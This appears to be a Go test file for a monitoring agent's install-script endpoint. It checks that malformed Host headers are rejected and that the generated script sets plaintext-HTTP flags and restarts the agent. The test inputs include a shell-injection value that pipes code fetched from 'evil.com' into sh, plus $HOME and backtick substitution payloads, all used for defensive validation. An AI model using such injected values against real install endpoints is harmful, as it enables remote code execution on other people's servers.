package agents

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestHandleInstallScriptRejectsMalformedHost(t *testing.T) {
	t.Setenv("SENTRIX_PUBLIC_URL", "")
	handler := HandleInstallScript()

	badHosts := []string{
		`evil.com"; curl evil.com/pwn | sh #`,
		"evil.com/path",
		"evil.com$HOME",
		"evil.com`id`",
		"",
	}

	for _, h := range badHosts {
		req := httptest.NewRequest(http.MethodGet, "/install.sh", nil)
		req.Host = h
		rr := httptest.NewRecorder()
		handler.ServeHTTP(rr, req)
		if rr.Code != http.StatusBadRequest {
			t.Fatalf("Host %q: expected 400, got %d", h, rr.Code)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/install.sh", nil)
	req.Host = "monitor.example.com:8080"
	rr := httptest.NewRecorder()
	handler.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("valid Host: expected 200, got %d", rr.Code)
	}
	if !strings.Contains(rr.Body.String(), `SENTRIX_SERVER="http://monitor.example.com:8080"`) {
		t.Fatalf("expected valid host in install script, got %q", rr.Body.String()[:120])
	}
}

// An http:// server URL must also opt the agent into plaintext transport,
// otherwise the agent refuses to send telemetry and never shows up.
func TestGenerateInstallScriptEnablesInsecureHTTPForPlainHTTP(t *testing.T) {
	script := generateInstallScript("http://192.168.1.10:8080")
	for _, want := range []string{
		`ALLOW_INSECURE_HTTP="1"`,
		`SENTRIX_ALLOW_INSECURE_HTTP=${ALLOW_INSECURE_HTTP}`,
	} {
		if !strings.Contains(script, want) {
			t.Fatalf("install script missing %q", want)
		}
	}
}

// A reinstall must replace the running agent, which "enable --now" would not do.
func TestGenerateInstallScriptRestartsAgent(t *testing.T) {
	script := generateInstallScript("https://sentrix.example.com")
	if !strings.Contains(script, "systemctl restart sentrix-agent") {
		t.Fatal("install script must restart sentrix-agent so a reinstall picks up the new credential")
	}
	if strings.Contains(script, "enable --now") {
		t.Fatal("install script should not rely on enable --now")
	}
}
